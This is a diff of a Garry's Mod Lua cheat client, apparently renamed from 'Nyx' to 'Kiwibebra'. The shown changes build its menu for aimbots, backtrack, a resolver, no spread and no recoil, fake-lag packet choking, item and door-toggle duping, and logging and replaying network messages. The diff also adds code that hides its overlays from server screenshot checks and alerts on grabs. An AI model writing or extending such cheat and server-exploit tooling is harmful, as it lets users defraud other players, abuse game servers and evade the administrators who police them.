+            draw.SimpleText("< " .. FILTERS[Index()][1] .. " >", "KiwibebraUI", w - 8, h / 2, C.accent, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
         end
 
         p.OnMousePressed = function(self, code)
@@ -15481,7 +16512,7 @@ do
         if not IsValid(c) then return nil end
 
         c:SetNoDraw(true)              -- only the viewer draws it
-        c.nyxCopy = true
+        c.kiwibebraCopy = true
 
         if parent then
             c:SetParent(parent)
@@ -15495,7 +16526,7 @@ do
 
     -- the copy's skeleton is the bone matrices taken from the real entity (see Capture)
     local function CopyBones(e, n)
-        local bones = e.nyxBones
+        local bones = e.kiwibebraBones
         if not bones then return end
 
         for i = 0, n - 1 do
@@ -15521,7 +16552,7 @@ do
             end
         end
 
-        c.nyxBones = bones
+        c.kiwibebraBones = bones
         c:InvalidateBoneCache()
     end
 
@@ -15776,11 +16807,11 @@ do
                 surface.DrawRect(gx, 1, 2, 2)
             end
 
-            draw.SimpleText(string.format("3D viewer  -  %s #%d", self.class, self.idx), "NyxUIBold", 8, TITLE_H / 2 + 1, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(string.format("3D viewer  -  %s #%d", self.class, self.idx), "KiwibebraUIBold", 8, TITLE_H / 2 + 1, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
             local cx = self:CursorPos()
             local hotX = self:IsHovered() and cx > w - 22 and select(2, self:CursorPos()) < TITLE_H
-            draw.SimpleText("x", "NyxUIBold", w - 11, TITLE_H / 2 + 1, hotX and C.accent or C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+            draw.SimpleText("x", "KiwibebraUIBold", w - 11, TITLE_H / 2 + 1, hotX and C.accent or C.textDim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
 
             -- the view
             local vx, vy, vw, vh = 8, TITLE_H + 4, w - 16, h - TITLE_H - INFO_H - 12
@@ -15815,7 +16846,7 @@ do
             lines[#lines + 1] = {"drag: turn   wheel: zoom   right click: reset", C.textDim}
 
             for i, l in ipairs(lines) do
-                draw.SimpleText(string.sub(l[1], 1, 64), "NyxUI", 10, iy + (i - 1) * 14, l[2], TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText(string.sub(l[1], 1, 64), "KiwibebraUI", 10, iy + (i - 1) * 14, l[2], TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
             end
         end
     end
@@ -15953,7 +16984,7 @@ do
         end, C.accent)
         AddButton(g, "NWVars of selected", function() EV.OpenVars("sel") end)
         AddButton(g, "NWVars of every entity", function() EV.OpenVars("all") end)
-        AddButton(g, "Dump all to data/nyx/nwvars.txt", EV.DumpVars)
+        AddButton(g, "Dump all to data/kiwibebra/nwvars.txt", EV.DumpVars)
         EndGroup(g)
     end
 end
@@ -16126,8 +17157,8 @@ do
             surface.DrawRect(1, 1, w - 2, 1)
 
             local title = key == "selfModel" and "Model browser - local" or "Model browser - others"
-            draw.SimpleText(title, "NyxUIBold", 10, 6, C.textHi)
-            draw.SimpleText("x", "NyxUIBold", w - 14, 5, C.textDim)
+            draw.SimpleText(title, "KiwibebraUIBold", 10, 6, C.textHi)
+            draw.SimpleText("x", "KiwibebraUIBold", w - 14, 5, C.textDim)
 
             -- search field
             surface.SetDrawColor(C.field)
@@ -16135,17 +17166,17 @@ do
             surface.SetDrawColor(C.accent)
             surface.DrawOutlinedRect(8, 26, LIST_W - 8, 20, 1)
             local shown = self.text ~= "" and self.text or "type to filter: rust, combine, csgo..."
-            draw.SimpleText(shown, "NyxUI", 14, 36, self.text ~= "" and C.textHi or C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(shown, "KiwibebraUI", 14, 36, self.text ~= "" and C.textHi or C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
-            draw.SimpleText(self.all and "[x] all models" or "[ ] all models", "NyxUI", w - 140, 36,
+            draw.SimpleText(self.all and "[x] all models" or "[ ] all models", "KiwibebraUI", w - 140, 36,
                 self.all and C.accent or C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
             local list = List()
             local S = M.scan
             local status = S.done and (#list .. " found / " .. #S.all .. " models")
                 or ("scanning... " .. S.dirs .. " folders, " .. #S.all .. " models")
-            draw.SimpleText(status, "NyxUISmall", LIST_W + 16, h - 30, C.textDim)
-            draw.SimpleText("wheel = scroll, click = wear, Esc = close", "NyxUISmall", LIST_W + 16, h - 16, C.textDim)
+            draw.SimpleText(status, "KiwibebraUISmall", LIST_W + 16, h - 30, C.textDim)
+            draw.SimpleText("wheel = scroll, click = wear, Esc = close", "KiwibebraUISmall", LIST_W + 16, h - 16, C.textDim)
 
             local rows = Rows()
             for r = 1, rows do
@@ -16164,8 +17195,8 @@ do
                 -- file name bright, its folder dim
                 local name = string.GetFileFromFilename(p)
                 local dir = string.sub(string.GetPathFromFilename(p), 8)     -- without "models/"
-                draw.SimpleText(name, "NyxUI", 12, y + ROW / 2, worn and C.accent or C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
-                draw.SimpleText(dir, "NyxUISmall", LIST_W - 4, y + ROW / 2, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
+                draw.SimpleText(name, "KiwibebraUI", 12, y + ROW / 2, worn and C.accent or C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+                draw.SimpleText(dir, "KiwibebraUISmall", LIST_W - 4, y + ROW / 2, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
             end
 
             -- scrollbar
@@ -16457,13 +17488,12 @@ local function BuildMenu()
             AddSlider(p, "Lead", r, "predict", 1, 10, 0, " ticks")
         end)
         AddCheck(g, "Extrapolation", r, "extrapOn", BT.X.Menu)
-        EndGroup(g)
 
+        -- backtrack, zxcmodule, resolver, no spread and no recoil live in this group as well
         local bt = cfg.backtrack
-        g = NewGroup(left, "Backtrack")
         AddCheck(g, "Backtrack (both aimbots)", bt, "enabled", function(p)
             AddList(p, "Backtrack mode", bt, "mode", {
-                {"Newest first (nyx)", "newest"}, {"Last ticks", "last"}, {"Closest", "closest"}, {"Scan", "scan"},
+                {"Newest first (kiwibebra)", "newest"}, {"Last ticks", "last"}, {"Closest", "closest"}, {"Scan", "scan"},
             })
             AddSlider(p, "Backtrack time", bt, "ms", 20, 1000, 0, "ms")
             AddCheck(p, "Extended: past 200 ms (module v6)", bt, "extended")
@@ -16475,21 +17505,45 @@ local function BuildMenu()
             AddLabel(p, "hidden now but was visible")
             AddLabel(p, "inside the window. Server")
             AddLabel(p, "takes ~200 ms at most.")
-            AddLabel(p, "With gmcl_nyx: records are server")
+            AddLabel(p, "With gmcl_kiwibebra: records are server")
             AddLabel(p, "ticks (simulation time) and the tick")
             AddLabel(p, "is written by the module.")
             AddLabel(p, BT.ModStatus, C.accent)
         end)
-        EndGroup(g)
 
+        -- turned on by itself whenever the rage aimbot is enabled (see the zxcmodule Think hook)
         local zx = cfg.zx
-        g = NewGroup(left, "zxcmodule")
-        AddCheck(g, "Use zxcmodule", zx, "enabled")
-        AddLabel(g, BT.ZXStatus, C.accent)
-        AddCheck(g, "Engine prediction (aimbots)", zx, "predict")
-        AddCheck(g, "Disable interpolation", zx, "noInterp")
-        AddCheck(g, "Disable sequence interpolation", zx, "noSeqInterp")
-        AddCheck(g, "Animation fix", zx, "animFix")
+        AddCheck(g, "Use zxcmodule", zx, "enabled", function(p)
+            AddLabel(p, BT.ZXStatus, C.accent)
+            AddCheck(p, "Engine prediction (aimbots)", zx, "predict")
+            AddCheck(p, "Disable interpolation", zx, "noInterp")
+            AddCheck(p, "Disable sequence interpolation", zx, "noSeqInterp")
+            AddCheck(p, "Animation fix", zx, "animFix")
+        end)
+
+        -- applies to whoever either aimbot is currently on, not to the whole server
+        local rs = cfg.resolver
+        AddCheck(g, "Resolver (aim target only)", rs, "enabled", function(p)
+            AddList(p, "Per shot", rs, "mode", {
+                {"+ step degrees", "step"}, {"List -180..180 by 60", "list"},
+            })
+            AddSlider(p, "Step", rs, "step", 5, 90, 0, "\194\176")
+            AddSlider(p, "Reset after", rs, "reset", 1, 20, 0, "s")
+            AddCheck(p, "Pitch resolver", rs, "pitch")
+            AddCheck(p, "Memory resolver", rs, "memory")
+            AddSlider(p, "Memory: misses allowed", rs, "memoryMisses", 1, 8, 0)
+            AddSlider(p, "Memory: keep for", rs, "memoryTime", 10, 900, 0, "s")
+            AddLabel(p, RS.Status)
+            AddButton(p, "Clear memory", RS.Clear)
+        end)
+
+        AddCheck(g, "No spread", cfg.nospread, "enabled")
+
+        local nr = cfg.norecoil
+        AddCheck(g, "No recoil (your own shots)", nr, "enabled", function(p)
+            AddSlider(p, "Strength", nr, "scale", 0, 2, 1, "x")
+        end)
+        AddCheck(g, "Skip M9K / HL2 pistol / bb / unclen8", nr, "exceptions")
         EndGroup(g)
 
         g = NewGroup(left, "Filters")
@@ -16535,41 +17589,6 @@ local function BuildMenu()
 
         g = NewGroup(right, "Target selection")
         AddList(g, "Priority", r, "priority", {{"Closest (distance)", "distance"}, {"Lowest health", "health"}, {"Closest to crosshair", "fov"}})
-        EndGroup(g)
-
-        -- applies to whoever either aimbot is currently on, not to the whole server
-        local rs = cfg.resolver
-        g = NewGroup(right, "Resolver")
-        AddCheck(g, "Resolver (aim target only)", rs, "enabled", function(p)
-            AddList(p, "Per shot", rs, "mode", {
-                {"+ step degrees", "step"}, {"List -180..180 by 60", "list"},
-            })
-            AddSlider(p, "Step", rs, "step", 5, 90, 0, "\194\176")
-            AddSlider(p, "Reset after", rs, "reset", 1, 20, 0, "s")
-            AddCheck(p, "Pitch resolver", rs, "pitch")
-            AddCheck(p, "Memory resolver", rs, "memory")
-            AddSlider(p, "Memory: misses allowed", rs, "memoryMisses", 1, 8, 0)
-            AddSlider(p, "Memory: keep for", rs, "memoryTime", 10, 900, 0, "s")
-            AddLabel(p, RS.Status)
-            AddButton(p, "Clear memory", RS.Clear)
-        end)
-        EndGroup(g)
-
-        local ns = cfg.nospread
-        g = NewGroup(right, "No spread")
-        AddCheck(g, "No spread", ns, "enabled")
-        EndGroup(g)
-
-        local nr = cfg.norecoil
-        g = NewGroup(right, "No recoil")
-        AddCheck(g, "No recoil (your own shots)", nr, "enabled", function(p)
-            AddSlider(p, "Strength", nr, "scale", 0, 2, 1, "x")
-            AddLabel(p, "Silent: the screen still kicks,")
-            AddLabel(p, "the bullets don't")
-        end)
-        AddCheck(g, "Skip M9K / HL2 pistol / bb / unclen8", nr, "exceptions")
-        AddLabel(g, "they don't kick through the punch")
-        AddLabel(g, "(also used by both aimbots)")
         EndGroup(g)
     end
 
@@ -16649,13 +17668,31 @@ local function BuildMenu()
             })
             AddSlider(p, "Choke (max)", aa, "flChoke", 1, 14, 0, " ticks")
             AddCheck(p, "Off while shooting", aa, "flOffShooting")
-            AddLabel(p, "With gmcl_nyx: real packet choke.")
+            AddLabel(p, "With gmcl_kiwibebra: real packet choke.")
             AddLabel(p, "Without: cl_cmdrate (the server clamps")
             AddLabel(p, "it to sv_mincmdrate, needs FPS above")
             AddLabel(p, "the packet rate).")
             AddLabel(p, BT.NetStatus, C.accent)
         end)
         AddLabel(g, MV.FakeLagStatus, C.accent)
+        EndGroup(g)
+
+        g = NewGroup(right, "Animation (local)")
+        AddCheck(g, "T-pose everyone", cfg.tpose, "enabled", function(p)
+            AddCheck(p, "Include yourself", cfg.tpose, "includeSelf")
+            AddLabel(p, "Visual only: the aimbot then uses")
+            AddLabel(p, "eye / body-centre points, not bones")
+        end)
+        AddCheck(g, "Sequence override", cfg.seq, "enabled", function(p)
+            AddSlider(p, "Sequence index", cfg.seq, "index", 0, 400, 0)
+            AddLabel(p, function()
+                local me = LocalPlayer()
+                if not IsValid(me) then return "" end
+                local idx = math.Clamp(math.floor(cfg.seq.index), 0, math.max(me:GetSequenceCount() - 1, 0))
+                return "Name: " .. tostring(me:GetSequenceName(idx))
+            end)
+            AddLabel(p, "Only you see it (third person)")
+        end)
         EndGroup(g)
     end
 
@@ -16763,7 +17800,7 @@ local function BuildMenu()
                     surface.DrawRect(x + 1, 0, cw - 2, h)
                     surface.SetDrawColor(C.boxBorder)
                     surface.DrawOutlinedRect(x + 1, 0, cw - 2, h, 1)
-                    draw.SimpleText(choice[1], "NyxUI", x + cw / 2, h / 2, on and C.bg or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
+                    draw.SimpleText(choice[1], "KiwibebraUI", x + cw / 2, h / 2, on and C.bg or C.text, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                 end
             end
 
@@ -16990,7 +18027,7 @@ local function BuildMenu()
             if S.queue then return "scanning... " .. #S.all .. " models" end
             return #MV.mdl.List() .. " registered, " .. #S.all .. " scanned"
         end)
-        AddLabel(g, "Any path: nyx_model self <path>")
+        AddLabel(g, "Any path: kiwibebra_model self <path>")
         AddLabel(g, "Only you see it")
         EndGroup(g)
 
@@ -17103,8 +18140,8 @@ local function BuildMenu()
                 AddSlider(p, "Rotation", w, "skyPicRot", -30, 30, 1, " deg/s")
                 AddSlider(p, "Brightness", w, "skyPicBright", 0.2, 2, 2, "x")
                 AddLabel(p, SKYPIC.Status)
-                AddLabel(p, "Pictures: data/nyx/bg/ (png, jpg)")
-                AddLabel(p, "or: nyx_sky_url <link> [name]")
+                AddLabel(p, "Pictures: data/kiwibebra/bg/ (png, jpg)")
+                AddLabel(p, "or: kiwibebra_sky_url <link> [name]")
             end)
         end)
         EndGroup(g)
@@ -17127,7 +18164,6 @@ local function BuildMenu()
             AddSlider(p, "Turn scale", m, "ebTurnScale", 0, 1, 2, "x")
             AddSlider(p, "Mouse lock", m, "ebLock", 0, 0.95, 2)
             AddCheck(p, "Draw predicted fall", m, "ebDraw")
-            AddCheck(p, "Indicator", m, "ebIndicator")
             AddLabel(p, "Tries stand / duck, with and")
             AddLabel(p, "without your keys; replays the")
             AddLabel(p, "one that clips the fall on an edge.")
@@ -17326,9 +18362,10 @@ local function BuildMenu()
             AddLabel(p, "Burst: low cmdrate + high FPS = more")
             AddLabel(p, "uses in one tick. fps_max 0 in console.")
             AddLabel(p, "Right-click the check: bind it to Hold")
-            AddLabel(p, "Class: console  nyx_bag_class <class>")
+            AddLabel(p, "Class: console  kiwibebra_bag_class <class>")
             AddLabel(p, "(default rust_itembag)")
         end)
+        AddCheck(g, "Door-toggle dupe (V)", bs, "doorDupe")
         EndGroup(g)
 
         local nl, log = cfg.netlog, BAG.Log
@@ -17339,14 +18376,14 @@ local function BuildMenu()
             AddButton(p, "Dump last 40 to console", function() log.Dump(40) end)
             AddButton(p, "Ignore the last message", log.IgnoreLast)
             AddButton(p, "Replay the last sent", log.ReplayLast)
-            AddButton(p, "Save to data/nyx/netlog.txt", log.Save)
+            AddButton(p, "Save to data/kiwibebra/netlog.txt", log.Save)
             AddButton(p, "Clear", log.Clear)
             AddLabel(p, "Marker before an action, then do it:")
             AddLabel(p, "what follows is what it sent.")
-            AddLabel(p, "bind a key: bind f6 nyx_net_mark")
-            AddLabel(p, "Window: bind f7 nyx_net_menu")
-            AddLabel(p, "Console: nyx_net_replay <#> [times]")
-            AddLabel(p, "         nyx_net_lua <#> (copies it)")
+            AddLabel(p, "bind a key: bind f6 kiwibebra_net_mark")
+            AddLabel(p, "Window: bind f7 kiwibebra_net_menu")
+            AddLabel(p, "Console: kiwibebra_net_replay <#> [times]")
+            AddLabel(p, "         kiwibebra_net_lua <#> (copies it)")
         end)
         AddButton(g, "Open log window", log.ToggleWindow)
         AddButton(g, "Insert marker", log.Mark)
@@ -17361,26 +18398,8 @@ local function BuildMenu()
             })
             AddSlider(p, "Delay", ks, "delay", 0, 5, 1, "s")
             AddLabel(p, KS.Status)
-            AddLabel(p, "Custom: console  nyx_killsay <text>")
+            AddLabel(p, "Custom: console  kiwibebra_killsay <text>")
             AddLabel(p, "{name} = the victim's name")
-        end)
-        EndGroup(g)
-
-        g = NewGroup(right, "Animation (local)")
-        AddCheck(g, "T-pose everyone", cfg.tpose, "enabled", function(p)
-            AddCheck(p, "Include yourself", cfg.tpose, "includeSelf")
-            AddLabel(p, "Visual only: the aimbot then uses")
-            AddLabel(p, "eye / body-centre points, not bones")
-        end)
-        AddCheck(g, "Sequence override", cfg.seq, "enabled", function(p)
-            AddSlider(p, "Sequence index", cfg.seq, "index", 0, 400, 0)
-            AddLabel(p, function()
-                local me = LocalPlayer()
-                if not IsValid(me) then return "" end
-                local idx = math.Clamp(math.floor(cfg.seq.index), 0, math.max(me:GetSequenceCount() - 1, 0))
-                return "Name: " .. tostring(me:GetSequenceName(idx))
-            end)
-            AddLabel(p, "Only you see it (third person)")
         end)
         EndGroup(g)
 
@@ -17389,6 +18408,13 @@ local function BuildMenu()
         AddLabel(g, "Hides ESP, FOV circle, third person and")
         AddLabel(g, "this menu from render.Capture / jpeg")
         AddLabel(g, function() return "Captures hidden: " .. SSG.hidden end, C.accent)
+        AddCheck(g, "Grab alert", cfg.misc, "ssAlert", function(p)
+            AddCheck(p, "Shutter sound", cfg.misc, "ssSound")
+            AddCheck(p, "Show + save the grab", cfg.misc, "ssPreview")
+            AddLabel(p, "Saved to data/kiwibebra/grabs/")
+        end)
+        AddLabel(g, function() return "Grabs seen: " .. SSG.grabs end, C.accent)
+        AddButton(g, "Show last grab", function() SSG.time = RealTime() end)
         EndGroup(g)
 
         local wm = cfg.watermark
@@ -17461,14 +18487,14 @@ local function BuildMenu()
             if IsValid(menu) and menu.Resize then menu.Resize(660, 520) end
         end)
         AddButton(g, "Reset group layout", function()
-            cfg.menu.layout = ""
+            cfg.menu.layout = CFGS.defaultLayout or ""
             local old = menu
             timer.Simple(0, function()
                 if IsValid(old) then old:Remove() end
                 BuildMenu()
             end)
         end)
-        AddButton(g, "Unload", function() NyxUnload() end)
+        AddButton(g, "Unload", function() KiwibebraUnload() end)
         EndGroup(g)
     end
 
@@ -17504,8 +18530,8 @@ local function BuildMenu()
         AddButton(g, "Refresh list", BG.Refresh)
         AddButton(g, "Delete selected", BG.DeleteSelected)
         AddLabel(g, BG.Status, C.accent)
-        AddLabel(g, "Put png / jpg in data/nyx/bg/")
-        AddLabel(g, "or: nyx_bg_url <link> [name]")
+        AddLabel(g, "Put png / jpg in data/kiwibebra/bg/")
+        AddLabel(g, "or: kiwibebra_bg_url <link> [name]")
         EndGroup(g)
     end
 
@@ -17801,8 +18827,8 @@ local function BuildMenu()
             surface.SetDrawColor(C.accent)
             surface.DrawRect(1, 1, w - 2, 1)
 
-            draw.SimpleText("Search functions", "NyxUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
-            draw.SimpleText("Enter = go, Esc = close", "NyxUISmall", w - 10, 9, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
+            draw.SimpleText("Search functions", "KiwibebraUIBold", 10, 8, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText("Enter = go, Esc = close", "KiwibebraUISmall", w - 10, 9, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
 
             -- the text field
             surface.SetDrawColor(C.field)
@@ -17810,10 +18836,10 @@ local function BuildMenu()
             surface.SetDrawColor(C.accent)
             surface.DrawOutlinedRect(10, 24, w - 20, 20, 1)
 
-            draw.SimpleText(self.text, "NyxUI", 16, 34, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(self.text, "KiwibebraUI", 16, 34, C.textHi, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
             if math.floor(SysTime() * 2) % 2 == 0 then
-                surface.SetFont("NyxUI")
+                surface.SetFont("KiwibebraUI")
                 local tw = surface.GetTextSize(self.text)
 
                 surface.SetDrawColor(C.textHi)
@@ -17822,7 +18848,7 @@ local function BuildMenu()
 
             if #self.results == 0 then
                 local msg = self.text == "" and "Type a name: aim, chams, fog, bhop..." or "Nothing found"
-                draw.SimpleText(msg, "NyxUI", 12, 56 + 2, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+                draw.SimpleText(msg, "KiwibebraUI", 12, 56 + 2, C.textDim, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
                 return
             end
 
@@ -17836,10 +18862,10 @@ local function BuildMenu()
                     surface.DrawRect(1, y, 2, ROW_H)
                 end
 
-                draw.SimpleText(e.text, "NyxUI", 12, y + ROW_H / 2, i == self.sel and C.textHi or C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+                draw.SimpleText(e.text, "KiwibebraUI", 12, y + ROW_H / 2, i == self.sel and C.textHi or C.text, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
                 local where = TABS[e.tab] .. (e.via and ("  >  " .. e.via.text) or "")
-                draw.SimpleText(where, "NyxUISmall", w - 10, y + ROW_H / 2, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
+                draw.SimpleText(where, "KiwibebraUISmall", w - 10, y + ROW_H / 2, C.textDim, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
             end
         end
 
@@ -18035,7 +19061,7 @@ do
         end
 
         -- layout
-        surface.SetFont("NyxUI")
+        surface.SetFont("KiwibebraUI")
         local sepW = surface.GetTextSize(" | ")
         local textW = 0
 
@@ -18075,11 +19101,11 @@ do
         local tx, ty = x + PAD, y + BAR_H / 2
         for i, s in ipairs(segs) do
             if i > 1 then
-                draw.SimpleText(" | ", "NyxUI", tx, ty, COL_DIM, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+                draw.SimpleText(" | ", "KiwibebraUI", tx, ty, COL_DIM, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                 tx = tx + sepW
             end
 
-            draw.SimpleText(s[1], "NyxUI", tx, ty, s[2], TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(s[1], "KiwibebraUI", tx, ty, s[2], TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
             tx = tx + s[3]
         end
 
@@ -18097,12 +19123,12 @@ do
 
             -- row 1: how far the sent yaw is from your real one, and packet loss
             local fake = aaActive and math.abs(math.NormalizeAngle((MV.aaYaw or sentAng.y) - realAng.y)) or 0
-            draw.SimpleText(string.format("FAKE (%.1f\194\176)", fake), "NyxUI", ix + 8, iy + 12, accent, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
-            draw.SimpleText("LOSS " .. ply:PacketLoss() .. "%", "NyxUI", ix + infoW - 8, iy + 12, COL_TEXT, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(string.format("FAKE (%.1f\194\176)", fake), "KiwibebraUI", ix + 8, iy + 12, accent, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText("LOSS " .. ply:PacketLoss() .. "%", "KiwibebraUI", ix + infoW - 8, iy + 12, COL_TEXT, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
 
             -- row 2: IO, a three bar quality meter, then ping / tickrate
             local bars = ping < 60 and 3 or (ping < 140 and 2 or 1)
-            draw.SimpleText("IO", "NyxUI", ix + 8, iy + 28, COL_DIM, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
+            draw.SimpleText("IO", "KiwibebraUI", ix + 8, iy + 28, COL_DIM, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
 
             for i = 1, 3 do
                 local bh = 3 + i * 3
@@ -18114,7 +19140,7 @@ do
                 surface.DrawRect(ix + 28 + (i - 1) * 6, iy + 33 - bh, 4, bh)
             end
 
-            draw.SimpleText(string.format("%dms / %dhz", ping, tick), "NyxUI", ix + infoW - 8, iy + 28, COL_TEXT, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
+            draw.SimpleText(string.format("%dms / %dhz", ping, tick), "KiwibebraUI", ix + infoW - 8, iy + 28, COL_TEXT, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
         end
     end)
 end
@@ -18178,7 +19204,7 @@ do
 
         local a = shown[listId]
 
-        surface.SetFont("NyxUI")
+        surface.SetFont("KiwibebraUI")
         local w = MIN_W
         local h = TITLE_H + 4
 
@@ -18201,7 +19227,7 @@ do
             surface.DrawRect(x + gx, y, 2, 2)
         end
 
-        draw.SimpleText(title, "NyxUIBold", x + PAD, y + 5, Color(255, 255, 255, 255 * a), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+        draw.SimpleText(title, "KiwibebraUIBold", x + PAD, y + 5, Color(255, 255, 255, 255 * a), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
         local ry = y + TITLE_H + 2
         for _, s in ipairs(list) do
@@ -18209,10 +19235,10 @@ do
             local al = 255 * s.vis * a
             local slide = (1 - s.vis) * -14
 
-            draw.SimpleText(s.text, "NyxUI", x + PAD + slide, ry + 2, Color(c.r, c.g, c.b, al), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
+            draw.SimpleText(s.text, "KiwibebraUI", x + PAD + slide, ry + 2, Color(c.r, c.g, c.b, al), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
 
             if s.right then
-                draw.SimpleText(s.right, "NyxUISmall", x + w - PAD + slide, ry + 3, Color(COL_DIM.r, COL_DIM.g, COL_DIM.b, al), TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
+                draw.SimpleText(s.right, "KiwibebraUISmall", x + w - PAD + slide, ry + 3, Color(COL_DIM.r, COL_DIM.g, COL_DIM.b, al), TEXT_ALIGN_RIGHT, TEXT_ALIGN_TOP)
             end
 
             ry = ry + ROW_H * s.vis
@@ -18292,7 +19318,7 @@ do
     local fonts = {}
 
     local function Font(kind, size)
-        local name = "NyxInd" .. kind .. size
+        local name = "KiwibebraInd" .. kind .. size
         if not fonts[name] then
             surface.CreateFont(name, {font = "Verdana", size = size, weight = kind == "Speed" and 800 or 700, antialias = true})
             fonts[name] = true
@@ -18614,9 +19640,9 @@ local function Build()
 
     -- pixel look: small Tahoma with antialiasing off (hard 1 px edges), the 1 px black outline
     -- comes from SimpleTextOutlined; new names so a re-run doesn't keep the old smooth fonts
-    surface.CreateFont("NyxHitLogPx2", {font = "Tahoma", size = 11, weight = 700, antialias = false})   -- the indicators' face
-    surface.CreateFont("NyxHitNumPx", {font = "Tahoma", size = 13, weight = 800, antialias = false})
-    surface.CreateFont("NyxXIndPx", {font = "Tahoma", size = 11, weight = 700, antialias = false})
+    surface.CreateFont("KiwibebraHitLogPx2", {font = "Tahoma", size = 11, weight = 700, antialias = false})   -- the indicators' face
+    surface.CreateFont("KiwibebraHitNumPx", {font = "Tahoma", size = 13, weight = 800, antialias = false})
+    surface.CreateFont("KiwibebraXIndPx", {font = "Tahoma", size = 11, weight = 700, antialias = false})
 
     local function MarkColor(kind, a)
         local h = cfg.hits
@@ -18680,7 +19706,7 @@ local function Build()
                 if h.numbers and w.dmg > 0 then
                     local sp = (w.pos + Vector(0, 0, 8 + age * 30)):ToScreen()
                     if sp.visible then
-                        draw.SimpleTextOutlined("-" .. w.dmg, "NyxHitNumPx", sp.x, sp.y, MarkColor(w.kind, a),
+                        draw.SimpleTextOutlined("-" .. w.dmg, "KiwibebraHitNumPx", sp.x, sp.y, MarkColor(w.kind, a),
                             TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 1, Color(0, 0, 0, a * 0.8))
                     end
                 end
@@ -18700,13 +19726,13 @@ local function Build()
 
                 if a > 0 then
                     local x = 8 - (1 - slide) * 30
-                    surface.SetFont("NyxHitLogPx2")
+                    surface.SetFont("KiwibebraHitLogPx2")
                     local tag = "[" .. cfg.xind.name .. "] "
                     local tw = surface.GetTextSize(tag)
 
-                    draw.SimpleTextOutlined(tag, "NyxHitLogPx2", x, y, Color(title.r, title.g, title.b, 255 * a * slide),
+                    draw.SimpleTextOutlined(tag, "KiwibebraHitLogPx2", x, y, Color(title.r, title.g, title.b, 255 * a * slide),
                         TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, 200 * a * slide))
-                    draw.SimpleTextOutlined(l.text, "NyxHitLogPx2", x + tw, y, Color(l.col.r, l.col.g, l.col.b, 255 * a * slide),
+                    draw.SimpleTextOutlined(l.text, "KiwibebraHitLogPx2", x + tw, y, Color(l.col.r, l.col.g, l.col.b, 255 * a * slide),
                         TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(0, 0, 0, 200 * a * slide))
                     y = y + 12
                 end
@@ -18730,7 +19756,7 @@ local function Build()
         if xi.minDamage and cfg.rage.enabled then
             local md = MV.MinDamage()
             local col = cfg.rage.minDmgOverride and Color(xi.r, xi.g, xi.b) or Color(255, 255, 255)
-            draw.SimpleTextOutlined(md > 0 and tostring(md) or "-", "NyxXIndPx", cx + 7, cy - 6, col,
+            draw.SimpleTextOutlined(md > 0 and tostring(md) or "-", "KiwibebraXIndPx", cx + 7, cy - 6, col,
                 TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, outline)
         end
 
@@ -18739,7 +19765,7 @@ local function Build()
         -- title: a light sweep runs across it
         do
             local name = xi.name
-            surface.SetFont("NyxXIndPx")
+            surface.SetFont("KiwibebraXIndPx")
             local tw = surface.GetTextSize(name)
             local x = cx - tw / 2
             local sweep = (RealTime() * 0.8) % 1.6 - 0.3
@@ -18750,7 +19776,7 @@ local function Build()
                 local f = math.Clamp(1 - math.abs((i - 0.5) / #name - sweep) * 4, 0, 1)
